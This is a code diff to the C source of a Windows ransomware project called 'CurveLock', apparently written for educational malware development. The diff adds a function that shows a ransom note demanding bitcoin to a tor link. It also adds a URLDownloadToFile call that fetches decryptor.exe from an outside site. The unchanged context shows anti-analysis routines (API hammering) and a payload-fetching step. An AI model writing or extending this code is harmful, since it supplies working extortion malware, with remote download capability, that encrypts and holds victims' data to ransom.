@@ -1,10 +1,8 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "common.h"
-
-// Definitions
-#define NEW_STREAM L":CurveLockRandomStream"
-#define TMPFILE	L"CurveLock.tmp"
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
 
 // Generate a random seed at compile time
 int RandomCompileTimeSeed(void)
@@ -17,7 +15,6 @@ int RandomCompileTimeSeed(void)
 		__TIME__[1] * 3600 +
 		__TIME__[0] * 36000;
 }
-
 
 // Helper function that allocates a buffer and returns its base address
 PVOID Helper(PVOID* ppAddress) {
@@ -227,6 +224,47 @@ BOOL ApiHammering(DWORD dwStress) {
 	return TRUE;
 }
 
+// Function to ask user to payup
+void ShowDownloadPopup() {
+
+	// Initial message box asking the user to pay up
+	int msgboxID = MessageBox(
+		NULL,
+		L"Your data has been encrypted. In order to decrypt your data, Pay 1000 bitcoins to the following tor link - <Example Tor link>. \n \t Click Ok To Continue",
+		L"CurveLock",
+		MB_ICONINFORMATION | MB_OKCANCEL
+	);
+	// Downloading Decryptor.exe from the site
+	if (msgboxID == IDOK) {
+		HRESULT hr = URLDownloadToFile(
+			NULL,
+			L"http://www.curvelock.site/decryptor.exe",
+			L"decryptor.exe",
+			0,
+			NULL
+		);
+
+		// Message box to inform the user if the decryptor download was successful
+		if (SUCCEEDED(hr)) {
+			MessageBox(
+				NULL,
+				L"The decryptor has been downloaded successfully.",
+				L"CurveLock",
+				MB_ICONINFORMATION | MB_OK
+			);
+		}
+
+		// Message box to inform the user if the decryptor download failed
+		else {
+			MessageBox(
+				NULL,
+				L"Failed to download the decryptor.",
+				L"CurveLock",
+				MB_ICONERROR | MB_OK
+			);
+		}
+	}
+}
 
 int main() {
 
@@ -257,6 +295,9 @@ int main() {
 	if (!fetchPayload()) {
 		printf("[!] Failed To Fetch Payload \n");
 	}
+
+	// Ask the user to pay up
+	ShowDownloadPopup();
 	
 	return 0;
 }
